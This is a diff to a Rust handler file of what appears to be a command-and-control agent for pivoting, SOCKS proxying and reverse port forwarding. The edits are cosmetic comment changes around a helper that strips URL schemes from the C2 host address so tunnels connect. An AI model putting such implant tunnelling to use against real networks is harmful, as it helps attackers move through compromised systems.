@@ -1,4 +1,4 @@
-// src/agent/handlers/network.rs — Pivot, SOCKS proxy, reverse port forwarding
+// src/agent/handlers/network.rs - Pivot, SOCKS proxy, reverse port forwarding
 
 use tokio::net::TcpStream;
 use tokio_util::compat::{TokioAsyncReadCompatExt, FuturesAsyncReadCompatExt};
@@ -17,14 +17,14 @@ use super::{HandlerContext, DispatchResult, AgentAction, RportfwdHandle};
 /// ("192.168.56.1") but as a full URL for HTTP transports
 /// ("https://192.168.56.1" or "http://192.168.56.1:8080").
 ///
-/// TcpStream::connect() requires "host:port" — if c2_host contains a scheme,
+/// TcpStream::connect() requires "host:port" - if c2_host contains a scheme,
 /// the format!("{}:{}", host, port) produces "https://192.168.56.1:TUNNELPORT"
 /// which is not a valid socket address and connect() returns an error,
 /// silently dropping the tunnel connection.
 fn bare_host(c2_host: &str) -> &str {
     // Strip "https://", "http://", or any other scheme
     if let Some(rest) = c2_host.strip_prefix("https://") {
-        // Also strip any trailing path: "192.168.56.1:4443/beacon" → "192.168.56.1:4443"
+        // Also strip any trailing path: "192.168.56.1:4443/beacon" -> "192.168.56.1:4443"
         rest.split('/').next().unwrap_or(rest)
     } else if let Some(rest) = c2_host.strip_prefix("http://") {
         rest.split('/').next().unwrap_or(rest)
@@ -77,7 +77,7 @@ pub async fn handle_proxy_start(ctx: &HandlerContext, cmd: &str, _req_id: u64) -
     // Strip URL scheme so TcpStream::connect gets a plain "host:port" address.
     // Without this, HTTP-transport agents set c2_host = "https://192.168.56.1"
     // and the connect address becomes "https://192.168.56.1:TUNNELPORT" which
-    // is not a valid socket address — connect() fails and the tunnel never forms.
+    // is not a valid socket address - connect() fails and the tunnel never forms.
     let host = bare_host(&ctx.c2_host).to_string();
 
     let handle = tokio::spawn(async move {
